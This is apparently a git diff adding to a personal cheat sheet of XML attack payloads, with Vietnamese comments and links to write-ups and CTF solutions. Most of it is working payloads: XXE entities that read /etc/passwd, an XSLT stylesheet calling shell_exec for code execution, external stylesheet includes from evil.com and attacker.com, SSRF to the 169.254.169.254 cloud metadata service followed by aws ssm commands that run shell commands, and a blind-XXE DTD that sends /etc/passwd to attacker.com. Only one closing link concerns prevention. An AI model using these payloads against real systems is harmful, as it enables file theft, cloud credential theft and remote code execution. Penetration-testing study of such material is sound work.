@@ -1,10 +1,73 @@
+test <!DOCTYPE foo [ <!ENTITY pass "abc"> ]>
+
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY pass SYSTEM "file:///etc/passwd"> ]>
 <stockCheck><productId>&pass;</productId></stockCheck>
-#--------------------------------SSRF
+#----------------------------------------XSLT   chuyển đổi xml thành các định dạng khác 
+https://hackmd.io/@endy/rJyXAyofn
+PHP cũ (<= 5.4.0 )
+https://hackmd.io/@endy/S1V81Ip7h
+https://blog.viettelcybersecurity.com/saml-show-stopper/   --java
+https://www.aperikube.fr/docs/aperictf_2019/js_art/  RCE  case study  bypass some block
+#------------output file
+<xsl:stylesheet version="1.0"
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:sax="http://icl.com/saxon"
+    extension-element-prefixes="sax">
+    <xsl:template match="/">
+        <sax:output href="endy" method="text">
+            <xsl:value-of select="'endyyyyy...'"/>
+        </sax:output>
+    </xsl:template>
+</xsl:stylesheet>
+#------------RCE  PHP functions 
+<?xml version ="1.0" encoding="UTF-8"?>
+  <xsl:stylesheet version="1.0"
+      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+      xmlns:php="http://php.net/xsl">
+            
+      <xsl:output method="html" />
+      <xsl:template match="/">
+          <xsl:value-of select="php:function('shell_exec', 'id')" />
+      </xsl:template>
+  </xsl:stylesheet>
+#---------------------OOB
+XSLT cho phép include external XSL bằng các cách sau:
+
+<?xml version="1.0"?>
+<?xml-stylesheet type="text/xsl" href="http://evil.com/evil.xsl"?>
+
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+      <xsl:import href="http://attacker.com/evil.xsl"/>
+      <xsl:include href="http://attacker.com/evil.xsl"/>
+</xsl:stylesheet>
+#--------------------------------SSRF to read metadata ---> RCE
+https://viblo.asia/p/xxe-injection-vulnerabilities-phan-2-W13VMgmQJY7
+IPv6: http://[fd00:ec2::254]/latest/meta-data/
+
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE slove [ <!ENTITY flag SYSTEM "http://168.254.169.254/"> ]>
+<!DOCTYPE slove [ <!ENTITY flag SYSTEM "http://169.254.169.254/"> ]>
 <stockCheck><productId>&flag;</productId></stockCheck>
+
+aws to exploit
+aws ssm describe-instance-information --output text --query
+aws ssm send-command --document-name "AWS-RunShellScript" --comment "RCE test: whoami" --targets "Key=instanceids,Values=[instanceid]" --parameters 'commands=whoami'
+#--------------------------------Blind XXE 
+https://viblo.asia/p/xxe-injection-vulnerabilities-phan-3-qPoL7z3aJvk
+<!DOCTYPE abc [ <!ENTITY xxe SYSTEM "http://[COLLABORATOR-DOMAIN]"> ]>
+<user>
+    <username>&xxe;</username>
+    <password>a</password>
+</user>
+#---------------------------Blind XXE block &
+<!DOCTYPE abc [ <!ENTITY % xxe SYSTEM "http://[DOMAIN-COLLABORATOR]"> %xxe; ]>   --test
+
+#---------------------load via .dtd file
+https://viblo.asia/p/xxe-injection-vulnerabilities-phan-4-Ny0VGEmDJPA
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
 #--------------------------------POST
 productId=<foo xmlns:link="http://www.w3.org/2001/XInclude">
 <link:include parse="text" href="file:///etc/passwd"/></foo>&StoreId=3
@@ -18,3 +81,5 @@ create file.svg with content
 https://viblo.asia/p/tim-hieu-va-khai-thac-loi-xxe-bJzKmVgYZ9N
 #--------------------------------XXE + RCE
 https://ctf.zeyu2001.com/2021/spbctfs-student-ctf-quals/31-line-php
+#-----------------------------------prevent
+https://viblo.asia/p/xxe-injection-vulnerabilities-phan-6-oK9VyQd0VQR
